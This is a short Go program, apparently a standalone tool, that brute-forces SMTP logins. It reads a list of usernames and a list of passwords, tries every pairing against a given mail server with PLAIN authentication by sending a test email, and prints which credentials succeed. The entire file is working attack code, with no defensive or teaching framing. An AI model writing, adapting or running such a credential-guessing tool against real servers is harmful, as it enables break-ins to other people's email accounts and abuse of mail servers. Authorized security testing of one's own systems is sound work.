package main

import (
	"bufio"
	"fmt"
	"log"
	"net/smtp"
	"os"
)


func readLines(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}


func tryLogin(smtpHost string, smtpPort string, user string, password string) error {
	auth := smtp.PlainAuth("", user, password, smtpHost)
	client := smtpHost + ":" + smtpPort
	err := smtp.SendMail(client, auth, user, []string{user}, []byte("Test email"))
	return err
}

func main() {
	
	if len(os.Args) < 5 {
		fmt.Println("Usage: ",os.Args[0],"<smtpHost> <smtpPort> <userListFile> <passwordListFile>")
		os.Exit(1)
	}

	
	smtpHost := os.Args[1]
	smtpPort := os.Args[2]
	userListFile := os.Args[3]
	passwordListFile := os.Args[4]

	
	users, err := readLines(userListFile)
	if err != nil {
		log.Fatalf("Failed to read user list file: %v", err)
	}

	passwords, err := readLines(passwordListFile)
	if err != nil {
		log.Fatalf("Failed to read password list file: %v", err)
	}

	
	for _, user := range users {
		for _, password := range passwords {
			fmt.Printf("Trying user: %s, password: %s\n", user, password)
			err := tryLogin(smtpHost, smtpPort, user, password)
			if err != nil {
				fmt.Printf("Login failed for user: %s, password: %s\n", user, password)
			} else {
				fmt.Printf("Login succeeded for user: %s, password: %s\n", user, password)
			}
		}
	}
}
